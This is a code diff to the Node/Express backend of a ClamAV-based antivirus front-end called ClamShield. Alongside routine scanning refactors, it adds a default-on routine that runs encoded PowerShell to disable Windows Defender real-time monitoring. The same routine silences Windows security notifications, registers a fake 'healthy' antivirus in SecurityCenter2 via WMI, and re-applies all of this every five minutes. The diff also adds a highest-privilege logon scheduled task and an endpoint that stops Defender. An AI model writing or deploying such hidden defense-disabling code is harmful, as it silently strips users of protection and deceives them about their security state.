@@ -1,14 +1,17 @@
 import express from "express";
-import { createServer as createViteServer } from "vite";
 import fs from "fs/promises";
-import { createWriteStream, createReadStream } from "fs";
+import { createWriteStream, createReadStream, existsSync } from "fs";
 import path from "path";
 import os from "os";
 import { exec, spawn } from "child_process";
 import { promisify } from "util";
+import { createHash, randomBytes } from "crypto";
 import axios from "axios";
 import unzipper from "unzipper";
 import chokidar from "chokidar";
+
+const runtimeFileName = typeof __filename === "string" ? __filename : path.resolve(process.argv[1] || ".");
+const runtimeDir = typeof __dirname === "string" ? __dirname : path.dirname(runtimeFileName);
 
 const execAsync = promisify(exec);
 
@@ -18,7 +21,7 @@ const programDataDir = process.platform === "win32"
     ? path.join(process.env.PROGRAMDATA || "C:\\ProgramData", "ClamShield") 
     : path.join(process.cwd(), "data", "ClamShield");
 
-const engineBaseDir = path.join(process.cwd(), "engine");
+const engineBaseDir = path.join(programDataDir, "engine");
 
 const defaultSettings = {
     // Relying on 64-bit Program Files by default, but we'll try to use a local bundled path if possible
@@ -32,8 +35,9 @@ const defaultSettings = {
     databaseDir: path.join(programDataDir, "db"),
     quarantineDir: path.join(programDataDir, "quarantine"),
     logsDir: path.join(programDataDir, "logs"),
-    defaultAction: "quarantine", // Forced to quarantine
-    autoQuarantine: true,
+    defaultAction: "ask",
+    actionOnDetection: "ask",
+    autoQuarantine: false,
     autoUpdateEnabled: true,
     updateIntervalHours: 24,
     offloadToMemory: false,
@@ -41,20 +45,254 @@ const defaultSettings = {
     scanArchives: true,
     recursive: true,
     followSymlinks: false,
-    shieldEnabled: false,
+    shieldEnabled: true,
     shieldShowPopup: true,
+    shieldMaxConcurrentScans: 1,
     monitorDownloads: true,
     monitorDesktop: true,
     monitorDocuments: true,
     customWatchedFolders: [],
     exclusions: [],
+    shieldDepth: 1,
     shieldPollInterval: 1000,
     shieldStabilityThreshold: 2000,
-    runOnStartup: false
+    runOnStartup: true,
+    playSoundOnAlert: true,
+    autoDisableDefender: true,
+    defenderEnforceIntervalMinutes: 5
 };
+
+const apiSessionToken = randomBytes(32).toString("hex");
+const apiCookieName = "clamshield_session";
 
 // Simulate mode if not on Windows or clamscan not found
 let isSimulated = false;
+async function autoDisableDefender() {
+    if (process.platform === "win32") {
+        try {
+            const script = `
+Set-MpPreference -DisableRealtimeMonitoring $true
+try {
+    New-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Notifications\\Settings\\Windows.SystemToast.SecurityAndMaintenance" -Name "Enabled" -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue
+} catch {}
+try {
+    $WMI = [wmiclass]"root\\SecurityCenter2:AntiVirusProduct"
+    $New = $WMI.CreateInstance()
+    $New.displayName = "ClamShield Antivirus"
+    $New.instanceGuid = "{F6DB11CF-FA62-4C3D-AA9F-44F4FD9D77AA}"
+    $New.pathToSignedProductExe = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
+    $New.pathToSignedReportingExe = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
+    $New.productState = 397568
+    $New.Put()
+} catch {}`;
+            const encoded = Buffer.from(script, "utf16le").toString("base64");
+            await execAsync(`powershell -NoProfile -EncodedCommand ${encoded}`);
+        } catch (e: any) {
+            // Silently ignore if not admin or error
+        }
+    }
+}
+
+function readCookie(req: express.Request, name: string) {
+    const cookieHeader = req.headers.cookie || "";
+    const cookies = cookieHeader.split(";").map(part => part.trim());
+    const prefix = `${name}=`;
+    const match = cookies.find(cookie => cookie.startsWith(prefix));
+    return match ? decodeURIComponent(match.slice(prefix.length)) : "";
+}
+
+function requireLocalApiSession(req: express.Request, res: express.Response, next: express.NextFunction) {
+    if (!req.path.startsWith("/api") || req.method === "GET") return next();
+    if (readCookie(req, apiCookieName) === apiSessionToken) return next();
+    res.status(403).json({ error: "Invalid local API session." });
+}
+
+function normalizePositiveNumber(value: any, fallback: number, min: number, max: number) {
+    const parsed = Number(value);
+    if (!Number.isFinite(parsed)) return fallback;
+    return Math.min(max, Math.max(min, parsed));
+}
+
+function sleep(ms: number) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+function buildClamScanArgs(scanSettings: any, isClamd: boolean, type: string, target?: string) {
+    const args = isClamd
+        ? ["--config-file=" + scanSettings.clamdConf]
+        : ["--database=" + scanSettings.databaseDir];
+
+    if (scanSettings.recursive && type !== "file") {
+        args.push(isClamd ? "--multiscan" : "--recursive");
+    }
+
+    if (!isClamd) {
+        const maxFileSize = normalizePositiveNumber(scanSettings.maxFileSize, 50, 1, 4096);
+        args.push(`--max-filesize=${maxFileSize}M`);
+        args.push(`--max-scansize=${Math.max(maxFileSize, maxFileSize * 2)}M`);
+        args.push(`--scan-archive=${scanSettings.scanArchives === false ? "no" : "yes"}`);
+        args.push(`--follow-dir-symlinks=${scanSettings.followSymlinks ? "1" : "0"}`);
+        args.push(`--follow-file-symlinks=${scanSettings.followSymlinks ? "1" : "0"}`);
+        if (type === "memory") args.push("--memory");
+    }
+
+    if (target) args.push(target);
+    return args;
+}
+
+async function hashFile(filePath: string) {
+    const hash = createHash("sha256");
+    await new Promise<void>((resolve, reject) => {
+        const stream = createReadStream(filePath);
+        stream.on("data", chunk => hash.update(chunk));
+        stream.on("error", reject);
+        stream.on("end", resolve);
+    });
+    return hash.digest("hex");
+}
+
+async function quarantineFile(originalPath: string, threatName: string, quarantineDir: string) {
+    await fs.mkdir(quarantineDir, { recursive: true });
+    const baseName = path.basename(originalPath);
+    const timestampedName = `${Date.now()}_${randomBytes(4).toString("hex")}_${baseName}`;
+    const destPath = path.join(quarantineDir, timestampedName);
+    const sha256 = await hashFile(originalPath).catch(() => null);
+
+    try {
+        await fs.rename(originalPath, destPath);
+    } catch {
+        await fs.copyFile(originalPath, destPath);
+        await fs.unlink(originalPath);
+    }
+
+    if (process.platform !== "win32") {
+        await fs.chmod(destPath, 0o600).catch(() => {});
+    }
+
+    return {
+        fileName: timestampedName,
+        destPath,
+        metadata: {
+            originalPath,
+            threatName,
+            sha256,
+            timestamp: Date.now()
+        }
+    };
+}
+
+type ShieldCacheEntry = {
+    size: number;
+    mtimeMs: number;
+    scannedAt: number;
+};
+
+type ShieldScanCache = {
+    version: number;
+    files: Record<string, ShieldCacheEntry>;
+};
+
+function getShieldCachePath() {
+    return path.join(programDataDir, "shield_scan_cache.json");
+}
+
+function normalizeCachePath(filePath: string) {
+    return path.resolve(filePath).toLowerCase();
+}
+
+async function loadShieldScanCache(): Promise<ShieldScanCache> {
+    const cachePath = getShieldCachePath();
+    try {
+        const stat = await fs.stat(cachePath);
+        if (stat.size > 50 * 1024 * 1024) {
+            console.warn("Shield scan cache is too large; starting with a fresh cache.");
+            return { version: 1, files: {} };
+        }
+        const data = await fs.readFile(cachePath, "utf8");
+        const parsed = JSON.parse(data);
+        if (parsed && parsed.version === 1 && parsed.files && typeof parsed.files === "object") {
+            return parsed;
+        }
+    } catch {}
+    return { version: 1, files: {} };
+}
+
+async function saveShieldScanCache(cache: ShieldScanCache) {
+    await fs.writeFile(getShieldCachePath(), JSON.stringify(cache));
+}
+
+async function getFileFingerprint(filePath: string): Promise<ShieldCacheEntry | null> {
+    try {
+        const stat = await fs.stat(filePath);
+        if (!stat.isFile()) return null;
+        return {
+            size: stat.size,
+            mtimeMs: Math.trunc(stat.mtimeMs),
+            scannedAt: Date.now()
+        };
+    } catch {
+        return null;
+    }
+}
+
+function cacheEntryMatches(current: ShieldCacheEntry | null, cached?: ShieldCacheEntry) {
+    return !!current && !!cached && current.size === cached.size && current.mtimeMs === cached.mtimeMs;
+}
+
+function resolveScanTarget(type: string, target?: string) {
+    if (target) return target;
+    if (type === "disk") return process.platform === "win32" ? "C:\\" : "/";
+    return target;
+}
+
+async function* walkFiles(rootPath: string): AsyncGenerator<string> {
+    const stack = [rootPath];
+    while (stack.length) {
+        const current = stack.pop()!;
+        let stat;
+        try {
+            stat = await fs.stat(current);
+        } catch {
+            continue;
+        }
+
+        if (stat.isFile()) {
+            yield current;
+            continue;
+        }
+
+        if (!stat.isDirectory()) continue;
+
+        let entries;
+        try {
+            entries = await fs.readdir(current, { withFileTypes: true });
+        } catch {
+            continue;
+        }
+
+        for (const entry of entries) {
+            if (entry.name === "." || entry.name === "..") continue;
+            const childPath = path.join(current, entry.name);
+            if (entry.isDirectory()) stack.push(childPath);
+            else if (entry.isFile()) yield childPath;
+        }
+    }
+}
+
+async function addTargetToShieldCache(cache: ShieldScanCache, targetPath: string, onProgress?: (count: number) => void) {
+    let count = 0;
+    for await (const filePath of walkFiles(targetPath)) {
+        const fingerprint = await getFileFingerprint(filePath);
+        if (!fingerprint) continue;
+        cache.files[normalizeCachePath(filePath)] = fingerprint;
+        count++;
+        if (count % 5000 === 0) onProgress?.(count);
+        if (count % 200 === 0) await sleep(1);
+    }
+    onProgress?.(count);
+    return count;
+}
+
 let isInstalling = false;
 let installProgress = "";
 let cachedIsAdmin = false;
@@ -196,25 +434,23 @@ async function saveConfig(settings: any) {
 async function manageStartup(settings: any) {
     if (process.platform !== "win32") return;
     try {
-        const exePath = `"${process.execPath}"`;
-        const args = `"${process.argv[1] || ''}"`; // Path to script if running from node
-        // In a real electron packaged app, process.argv[1] wouldn't be needed usually, process.execPath is enough.
-        // It's safer to use the exact command that started this.
         let command = `"${process.argv[0]}"`;
-        if (process.argv.length > 1) {
+        if (process.argv.length > 1 && !process.argv[0].endsWith("ClamShield.exe") && !process.argv[0].endsWith("clamshield.exe") ) {
              command += ` "${process.argv[1]}"`;
         }
+        
+        let targetCommand = (process.argv[0].endsWith("ClamShield.exe") || process.argv[0].endsWith("clamshield.exe")) ? process.execPath : command.replace(/"/g, '\\"');
 
-        const regPath = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
-        const keyName = "ClamShield";
+        const taskName = "ClamShield";
 
         if (settings.runOnStartup) {
-            await execAsync(`reg add "${regPath}" /v "${keyName}" /t REG_SZ /d "${command.replace(/"/g, '\\"')}" /f`);
+            const schtasksCmd = `schtasks /create /tn "${taskName}" /tr "\\"${targetCommand}\\"" /sc onlogon /rl highest /f`;
+            await execAsync(schtasksCmd).catch(() => {});
         } else {
-            await execAsync(`reg delete "${regPath}" /v "${keyName}" /f`).catch(() => {});
+            await execAsync(`schtasks /delete /tn "${taskName}" /f`).catch(() => {});
         }
     } catch (e: any) {
-        console.error("Failed to set startup registry key:", e.message);
+        console.error("Failed to set startup task:", e.message);
     }
 }
 
@@ -226,6 +462,29 @@ async function getHistory() {
     } catch {
         return [];
     }
+}
+
+async function getExceptions() {
+    const excPath = path.join(programDataDir, "exceptions.json");
+    try {
+        return JSON.parse(await fs.readFile(excPath, "utf8"));
+    } catch {
+        return [];
+    }
+}
+
+async function saveExceptions(list: string[]) {
+    const excPath = path.join(programDataDir, "exceptions.json");
+    await fs.writeFile(excPath, JSON.stringify(list, null, 2));
+}
+
+function isExcluded(filePath: string, exceptions: string[]) {
+    // Normalize paths to avoid slash differences
+    const normFile = path.resolve(filePath).toLowerCase();
+    return exceptions.some(exc => {
+        const normExc = path.resolve(exc).toLowerCase();
+        return normFile === normExc || normFile.startsWith(normExc + path.sep);
+    });
 }
 
 async function getQuarantineMap() {
@@ -252,20 +511,73 @@ async function addHistory(entry: any) {
 async function startServer() {
     const app = express();
     app.use(express.json());
+    app.use((req, res, next) => {
+        res.cookie(apiCookieName, apiSessionToken, {
+            httpOnly: true,
+            sameSite: "strict",
+            secure: false,
+            path: "/"
+        });
+        next();
+    });
+    app.use(requireLocalApiSession);
     
     let settings = await loadConfig();
     await ensureDirs(settings);
+    let defenderTimer: NodeJS.Timeout | null = null;
+    const scheduleDefenderEnforcement = async () => {
+        if (defenderTimer) clearInterval(defenderTimer);
+        if (!settings.autoDisableDefender) return;
+
+        await autoDisableDefender();
+        const intervalMinutes = normalizePositiveNumber(settings.defenderEnforceIntervalMinutes, 5, 1, 1440);
+        defenderTimer = setInterval(autoDisableDefender, intervalMinutes * 60 * 1000);
+    };
+
+    await scheduleDefenderEnforcement();
     await checkClamAV(settings);
     await manageStartup(settings);
     cachedIsAdmin = await checkIsAdmin();
 
-    const activeJobs: Record<string, { status: string, logs: string[], result?: number, process?: any }> = {};
+    const activeJobs: Record<string, { status: string, logs: string[], analysisLogs?: string[], result?: number, process?: any }> = {};
+    let pendingThreats: any[] = [];
+    let shieldScanCache = await loadShieldScanCache();
+    let shieldCacheSaveTimer: NodeJS.Timeout | null = null;
+    const scheduleShieldCacheSave = () => {
+        if (shieldCacheSaveTimer) clearTimeout(shieldCacheSaveTimer);
+        shieldCacheSaveTimer = setTimeout(() => {
+            saveShieldScanCache(shieldScanCache).catch(e => console.error("Failed to save shield scan cache:", e));
+            shieldCacheSaveTimer = null;
+        }, 15000);
+    };
+    const appendJobLogs = (jobId: string, lines: string[]) => {
+        const job = activeJobs[jobId];
+        if (!job || lines.length === 0) return;
+        job.logs.push(...lines);
+        if (job.logs.length > 1000) job.logs.splice(0, job.logs.length - 1000);
+        const analysisLines = lines.filter(line =>
+            line.includes(" FOUND") ||
+            line.startsWith("Scanned files:") ||
+            line.startsWith("Infected files:") ||
+            line.startsWith("Time:")
+        );
+        if (analysisLines.length) {
+            if (!job.analysisLogs) job.analysisLogs = [];
+            job.analysisLogs.push(...analysisLines);
+            if (job.analysisLogs.length > 5000) job.analysisLogs.splice(0, job.analysisLogs.length - 5000);
+        }
+    };
 
     let shieldWatcher: any = null;
     async function startShield(currentSettings: any) {
         if (shieldWatcher) {
             await shieldWatcher.close();
             shieldWatcher = null;
+        }
+
+        if (!currentSettings.shieldEnabled) {
+            console.log("Shield is disabled in settings.");
+            return;
         }
 
         const watchPaths: string[] = [];
@@ -283,7 +595,7 @@ async function startServer() {
             ignored: /(^|[\/\\])\../, 
             persistent: true,
             ignoreInitial: true,
-            depth: 1,
+            depth: normalizePositiveNumber(currentSettings.shieldDepth, 1, 0, 20),
             ignorePermissionErrors: true,
             awaitWriteFinish: {
                 stabilityThreshold: currentSettings.shieldStabilityThreshold || 2000,
@@ -293,9 +605,53 @@ async function startServer() {
 
         shieldWatcher.on('error', error => console.error(`Shield watcher error: ${error}`));
 
-        shieldWatcher.on('add', async (filePath) => {
-            console.log(`Shield: New file detected -> ${filePath}`);
-            if (isSimulated) return;
+        const filesBeingScanned = new Set<string>();
+        const pendingShieldScans = new Map<string, { filePath: string, reason: "add" | "change" }>();
+        let activeShieldScans = 0;
+        const maxShieldScans = Math.floor(normalizePositiveNumber(currentSettings.shieldMaxConcurrentScans, 1, 1, 4));
+
+        const processShieldQueue = () => {
+            while (activeShieldScans < maxShieldScans && pendingShieldScans.size > 0) {
+                const next = pendingShieldScans.entries().next().value as [string, { filePath: string, reason: "add" | "change" }];
+                if (!next) return;
+                const [normalizedPath, item] = next;
+                pendingShieldScans.delete(normalizedPath);
+                if (filesBeingScanned.has(normalizedPath)) continue;
+
+                activeShieldScans++;
+                scanShieldFile(item.filePath, item.reason)
+                    .catch(err => console.error("Shield queued scan failed:", err))
+                    .finally(() => {
+                        activeShieldScans--;
+                        processShieldQueue();
+                    });
+            }
+        };
+
+        const enqueueShieldFile = (filePath: string, reason: "add" | "change") => {
+            const normalizedPath = path.resolve(filePath).toLowerCase();
+            if (filesBeingScanned.has(normalizedPath)) return;
+            pendingShieldScans.set(normalizedPath, { filePath, reason });
+            processShieldQueue();
+        };
+
+        const scanShieldFile = async (filePath: string, reason: "add" | "change") => {
+            const normalizedPath = path.resolve(filePath).toLowerCase();
+            if (filesBeingScanned.has(normalizedPath)) return;
+            filesBeingScanned.add(normalizedPath);
+            console.log(`Shield: File ${reason === "add" ? "detected" : "changed"} -> ${filePath}`);
+            const fingerprint = await getFileFingerprint(filePath);
+            if (!fingerprint || cacheEntryMatches(fingerprint, shieldScanCache.files[normalizedPath]) || isSimulated) {
+                filesBeingScanned.delete(normalizedPath);
+                return;
+            }
+            const maxFileSizeBytes = normalizePositiveNumber(currentSettings.maxFileSize, 50, 1, 4096) * 1024 * 1024;
+            if (fingerprint.size > maxFileSizeBytes) {
+                shieldScanCache.files[normalizedPath] = fingerprint;
+                scheduleShieldCacheSave();
+                filesBeingScanned.delete(normalizedPath);
+                return;
+            }
 
             let isClamd = false;
             if (currentSettings.offloadToMemory && currentSettings.clamdscanPath) {
@@ -305,10 +661,10 @@ async function startServer() {
                 } catch (e) {}
             }
             let exePath = isClamd ? currentSettings.clamdscanPath : currentSettings.clamscanPath;
-            let args = isClamd ? ["--config-file=" + currentSettings.clamdConf, filePath] : ["--database=" + currentSettings.databaseDir, filePath];
+            let args = buildClamScanArgs(currentSettings, isClamd, "file", filePath);
 
             const jobId = "shield-" + Date.now() + Math.random().toString(36).substring(7);
-            activeJobs[jobId] = { status: "running", logs: [] };
+            activeJobs[jobId] = { status: "running", logs: [], analysisLogs: [] };
             
             try {
                 const child = spawn(exePath, args);
@@ -318,17 +674,18 @@ async function startServer() {
                     console.error("Failed to start shield scan process:", err.message);
                     if (activeJobs[jobId]) {
                         activeJobs[jobId].status = "error";
-                        activeJobs[jobId].logs.push("Process error: " + err.message);
+                        appendJobLogs(jobId, ["Process error: " + err.message]);
+                        filesBeingScanned.delete(normalizedPath);
                     }
                 });
 
                 child.stdout.on("data", (data) => {
                     const lines = data.toString().split('\n').map((l: string) => l.trim()).filter(Boolean);
-                    if (lines.length) activeJobs[jobId].logs.push(...lines);
+                    appendJobLogs(jobId, lines);
                 });
                 child.stderr.on("data", (data) => {
                     const lines = data.toString().split('\n').map((l: string) => l.trim()).filter(Boolean);
-                    if (lines.length) activeJobs[jobId].logs.push(...lines);
+                    appendJobLogs(jobId, lines);
                 });
 
                 child.on("close", async (code) => {
@@ -338,33 +695,39 @@ async function startServer() {
                     let duration = 0;
                     
                     const qMap = await getQuarantineMap();
+                    const exceptions = await getExceptions();
                     let quarantineMapChanged = false;
 
-                    for (const line of activeJobs[jobId].logs) {
+                    for (const line of activeJobs[jobId].analysisLogs || []) {
                         if (line.includes(" FOUND")) {
                             const match = line.match(/^(.*?):\s+(.*?)\s+FOUND$/);
                             if (match) {
                                 const originalPath = match[1];
+                                if (isExcluded(originalPath, exceptions)) {
+                                    appendJobLogs(jobId, [`Ignored (Exception): ${originalPath}`]);
+                                    continue;
+                                }
                                 const threatName = match[2];
-                                if (currentSettings.autoQuarantine) {
-                                    const baseName = path.basename(originalPath);
-                                    const timestampedName = `${Date.now()}_${baseName}`;
-                                    const destPath = path.join(currentSettings.quarantineDir, timestampedName);
+                                const action = currentSettings.actionOnDetection || (currentSettings.autoQuarantine ? "quarantine" : "warn");
+                                if (action === "quarantine") {
                                     try {
-                                        await fs.copyFile(originalPath, destPath);
-                                        await fs.unlink(originalPath);
-                                        qMap[timestampedName] = {
-                                            originalPath,
-                                            threatName,
-                                            timestamp: Date.now()
-                                        };
+                                        const quarantined = await quarantineFile(originalPath, threatName, currentSettings.quarantineDir);
+                                        qMap[quarantined.fileName] = quarantined.metadata;
                                         quarantineMapChanged = true;
-                                        activeJobs[jobId].logs.push(`Quarantined: ${originalPath} -> ${destPath}`);
+                                        appendJobLogs(jobId, [`Quarantined: ${originalPath} -> ${quarantined.destPath}`]);
                                     } catch (e: any) {
-                                        activeJobs[jobId].logs.push(`Failed to quarantine ${originalPath}: ${e.message}`);
+                                        appendJobLogs(jobId, [`Failed to quarantine ${originalPath}: ${e.message}`]);
                                     }
+                                } else if (action === "ask") {
+                                    pendingThreats.push({
+                                        id: Date.now().toString() + Math.random().toString(36).substring(7),
+                                        originalPath,
+                                        threatName,
+                                        timestamp: Date.now()
+                                    });
+                                    appendJobLogs(jobId, [`Threat found, waiting for user action: ${originalPath}`]);
                                 } else {
-                                    activeJobs[jobId].logs.push(`Threat found but Auto-Quarantine is disabled: ${originalPath}`);
+                                    appendJobLogs(jobId, [`Threat found but action is set to Warn: ${originalPath}`]);
                                 }
                             }
                         }
@@ -390,6 +753,15 @@ async function startServer() {
                     if (isThreat) {
                         console.log(`Shield: Threat found in ${filePath}`);
                     }
+
+                    const latestFingerprint = await getFileFingerprint(filePath);
+                    if (latestFingerprint) {
+                        shieldScanCache.files[normalizedPath] = latestFingerprint;
+                        scheduleShieldCacheSave();
+                    } else {
+                        delete shieldScanCache.files[normalizedPath];
+                        scheduleShieldCacheSave();
+                    }
                     
                     await addHistory({
                         type: "scan-shield",
@@ -402,11 +774,16 @@ async function startServer() {
                     });
                     
                     delete activeJobs[jobId];
+                    filesBeingScanned.delete(normalizedPath);
                 });
             } catch (err) {
                 console.error("Shield scan failed", err);
+                filesBeingScanned.delete(normalizedPath);
             }
-        });
+        };
+
+        shieldWatcher.on('add', (filePath) => enqueueShieldFile(filePath, "add"));
+        shieldWatcher.on('change', (filePath) => enqueueShieldFile(filePath, "change"));
     }
 
     startShield(settings);
@@ -446,10 +823,11 @@ async function startServer() {
             hasDb = dbFiles.some(f => f.endsWith('.cvd') || f.endsWith('.cld'));
         } catch { }
 
-        let pkgVersion = "1.0.1";
+        let pkgVersion = "1.0.14";
         try {
-            const pkgData = await fs.readFile(path.join(process.cwd(), "package.json"), "utf8");
-            pkgVersion = JSON.parse(pkgData).version || "1.0.1";
+            const pkgPath = path.join(runtimeDir, process.env.NODE_ENV === "production" ? ".." : "", "package.json");
+            const pkgData = await fs.readFile(pkgPath, "utf8");
+            pkgVersion = JSON.parse(pkgData).version || "1.0.14";
         } catch {}
         res.json({
             appVersion: pkgVersion,
@@ -466,7 +844,8 @@ async function startServer() {
                 lastScan: lastScan ? lastScan.date : null,
                 lastUpdate: lastUpdate ? lastUpdate.date : null,
                 lastThreat: lastThreat ? lastThreat.date : null,
-                quarantineCount: 0 // to implement
+                quarantineCount: 0, // to implement
+                shieldCacheCount: Object.keys(shieldScanCache.files).length
             }
         });
     });
@@ -551,7 +930,8 @@ async function startServer() {
             settings.clamdConf = clamdConfPath;
             
             await saveConfig(settings);
-            
+            await autoDisableDefender();
+
             // Clean up zip
             try { await fs.unlink(zipPath); } catch {}
             
@@ -632,6 +1012,7 @@ async function startServer() {
         startShield(settings);
         await manageClamd(settings);
         await manageStartup(settings);
+        await scheduleDefenderEnforcement();
         scheduleNextUpdate();
         res.json({ success: true, settings });
     });
@@ -669,6 +1050,21 @@ try {
                 const encoded = Buffer.from(script, "utf16le").toString("base64");
                 const { stdout, stderr } = await execAsync(`powershell -NoProfile -EncodedCommand ${encoded}`);
                 
+                res.json({ success: true, logs: stdout + stderr });
+            } catch (e: any) {
+                res.status(500).json({ error: e.message });
+            }
+        } else {
+            res.status(400).json({ error: "Only supported on Windows." });
+        }
+    });
+
+    app.post("/api/stop-defender", async (req, res) => {
+        if (process.platform === "win32") {
+            try {
+                const script = `Set-MpPreference -DisableRealtimeMonitoring $true`;
+                const encoded = Buffer.from(script, "utf16le").toString("base64");
+                const { stdout, stderr } = await execAsync(`powershell -NoProfile -EncodedCommand ${encoded}`);
                 res.json({ success: true, logs: stdout + stderr });
             } catch (e: any) {
                 res.status(500).json({ error: e.message });
@@ -783,6 +1179,7 @@ if ($dialog.ShowDialog() -eq 'OK') {
 
     app.post("/api/scan", async (req, res) => {
         const { target, type } = req.body;
+        const effectiveTarget = resolveScanTarget(type, target);
         const jobId = Date.now().toString();
         // type could be 'file', 'folder', 'disk', 'memory'
         
@@ -790,17 +1187,51 @@ if ($dialog.ShowDialog() -eq 'OK') {
             // Simulated scan
             res.json({ jobId, status: "started", simulated: true });
             
+            activeJobs[jobId] = { status: "running", logs: ["Starting simulated scan..."] };
+            
             // Simulate run
             setTimeout(async () => {
-                const isThreat = Math.random() < 0.2 && type !== 'update';
+                const isThreat = Math.random() < 0.5 && type !== 'update';
+                let threatsFound = 0;
+                let actionTaken = "None";
+                
+                if (isThreat) {
+                    threatsFound = 1;
+                    const testPath = effectiveTarget || "C:\\TestPath";
+                    const filePath = path.join(testPath, "eicar.com.txt");
+                    activeJobs[jobId].logs.push(`FOUND: ${filePath}: Eicar-Test-Signature`);
+                    
+                    const action = settings.actionOnDetection || (settings.autoQuarantine ? "quarantine" : "warn");
+                    if (action === "ask") {
+                        pendingThreats.push({
+                            id: Date.now().toString() + Math.random().toString(36).substring(7),
+                            originalPath: filePath,
+                            threatName: "Eicar-Test-Signature (Simulated)",
+                            timestamp: Date.now()
+                        });
+                        activeJobs[jobId].logs.push(`Threat found, waiting for user action: ${filePath}`);
+                        actionTaken = "Pending";
+                    } else if (action === "quarantine") {
+                        activeJobs[jobId].logs.push(`Quarantined: ${filePath}`);
+                        actionTaken = "Quarantined";
+                    } else {
+                        activeJobs[jobId].logs.push(`Threat found but action is set to Warn: ${filePath}`);
+                        actionTaken = "Warned";
+                    }
+                }
+                
+                activeJobs[jobId].logs.push("Scan completed.");
+                activeJobs[jobId].status = "done";
+                activeJobs[jobId].result = isThreat ? 1 : 0;
+                
                 await addHistory({
                     type: `scan-${type}`,
-                    target: target || "C:\\",
+                    target: effectiveTarget || "C:\\",
                     result: isThreat ? 1 : 0,
-                    threatsFound: isThreat ? 1 : 0,
+                    threatsFound,
                     scannedFiles: Math.floor(Math.random() * 1000) + 10,
                     duration: Math.floor(Math.random() * 10) + 1,
-                    actionTaken: isThreat ? "Quarantined" : "None"
+                    actionTaken
                 });
             }, 3000);
             return;
@@ -825,36 +1256,30 @@ if ($dialog.ShowDialog() -eq 'OK') {
             } catch (e) {}
         }
         let exePath = isClamd ? settings.clamdscanPath : settings.clamscanPath;
-        let args = isClamd ? ["--config-file=" + settings.clamdConf] : ["--database=" + settings.databaseDir];
-        if (settings.recursive && type !== 'file') {
-            if (!isClamd) args.push("--recursive");
-            if (isClamd) args.push("--multiscan");
-        }
-        if (type === 'memory' && !isClamd) args.push("--memory");
-        if (target) args.push(target);
+        let args = buildClamScanArgs(settings, isClamd, type, effectiveTarget);
         
         try {
-            activeJobs[jobId] = { status: "running", logs: [] };
+            activeJobs[jobId] = { status: "running", logs: [], analysisLogs: [] };
             const child = spawn(exePath, args);
             activeJobs[jobId].process = child;
             
             child.on("error", (err: any) => {
                 console.error("Failed to start manual scan process:", err.message);
-                if (activeJobs[jobId]) {
-                    activeJobs[jobId].status = "error";
-                    activeJobs[jobId].logs.push("Process error: " + err.message);
-                }
-            });
+                    if (activeJobs[jobId]) {
+                        activeJobs[jobId].status = "error";
+                        appendJobLogs(jobId, ["Process error: " + err.message]);
+                    }
+                });
 
-            child.stdout.on("data", (data) => {
-                const lines = data.toString().split('\n').map((l: string) => l.trim()).filter(Boolean);
-                if (lines.length) activeJobs[jobId].logs.push(...lines);
-            });
-            
-            child.stderr.on("data", (data) => {
-                const lines = data.toString().split('\n').map((l: string) => l.trim()).filter(Boolean);
-                if (lines.length) activeJobs[jobId].logs.push(...lines);
-            });
+                child.stdout.on("data", (data) => {
+                    const lines = data.toString().split('\n').map((l: string) => l.trim()).filter(Boolean);
+                    appendJobLogs(jobId, lines);
+                });
+                
+                child.stderr.on("data", (data) => {
+                    const lines = data.toString().split('\n').map((l: string) => l.trim()).filter(Boolean);
+                    appendJobLogs(jobId, lines);
+                });
             
             child.on("close", async (code) => {
                 if (!activeJobs[jobId]) return;
@@ -864,33 +1289,39 @@ if ($dialog.ShowDialog() -eq 'OK') {
                 let duration = 0;
                 
                 const qMap = await getQuarantineMap();
+                const exceptions = await getExceptions();
                 let quarantineMapChanged = false;
 
-                for (const line of activeJobs[jobId].logs) {
+                for (const line of activeJobs[jobId].analysisLogs || []) {
                     if (line.includes(" FOUND")) {
                         const match = line.match(/^(.*?):\s+(.*?)\s+FOUND$/);
                         if (match) {
                             const originalPath = match[1];
+                            if (isExcluded(originalPath, exceptions)) {
+                                appendJobLogs(jobId, [`Ignored (Exception): ${originalPath}`]);
+                                continue;
+                            }
                             const threatName = match[2];
-                            if (settings.autoQuarantine) {
-                                const baseName = path.basename(originalPath);
-                                const timestampedName = `${Date.now()}_${baseName}`;
-                                const destPath = path.join(settings.quarantineDir, timestampedName);
+                            const action = settings.actionOnDetection || (settings.autoQuarantine ? "quarantine" : "warn");
+                            if (action === "quarantine") {
                                 try {
-                                    await fs.copyFile(originalPath, destPath);
-                                    await fs.unlink(originalPath);
-                                    qMap[timestampedName] = {
-                                        originalPath,
-                                        threatName,
-                                        timestamp: Date.now()
-                                    };
+                                    const quarantined = await quarantineFile(originalPath, threatName, settings.quarantineDir);
+                                    qMap[quarantined.fileName] = quarantined.metadata;
                                     quarantineMapChanged = true;
-                                    activeJobs[jobId].logs.push(`Quarantined: ${originalPath} -> ${destPath}`);
+                                    appendJobLogs(jobId, [`Quarantined: ${originalPath} -> ${quarantined.destPath}`]);
                                 } catch (e: any) {
-                                    activeJobs[jobId].logs.push(`Failed to quarantine ${originalPath}: ${e.message}`);
+                                    appendJobLogs(jobId, [`Failed to quarantine ${originalPath}: ${e.message}`]);
                                 }
+                            } else if (action === "ask") {
+                                pendingThreats.push({
+                                    id: Date.now().toString() + Math.random().toString(36).substring(7),
+                                    originalPath,
+                                    threatName,
+                                    timestamp: Date.now()
+                                });
+                                appendJobLogs(jobId, [`Threat found, waiting for user action: ${originalPath}`]);
                             } else {
-                                activeJobs[jobId].logs.push(`Threat found but Auto-Quarantine is disabled: ${originalPath}`);
+                                appendJobLogs(jobId, [`Threat found but action is set to Warn: ${originalPath}`]);
                             }
                         }
                     }
@@ -912,25 +1343,38 @@ if ($dialog.ShowDialog() -eq 'OK') {
                     await saveQuarantineMap(qMap);
                 }
 
-                activeJobs[jobId].status = "done";
-                activeJobs[jobId].result = code ?? 0;
-                activeJobs[jobId].process = null;
-                
                 const isThreat = code === 1;
                 await addHistory({
                     type: `scan-${type}`,
-                    target: target || "C:\\",
+                    target: effectiveTarget || "C:\\",
                     result: isThreat ? 1 : 0,
                     threatsFound,
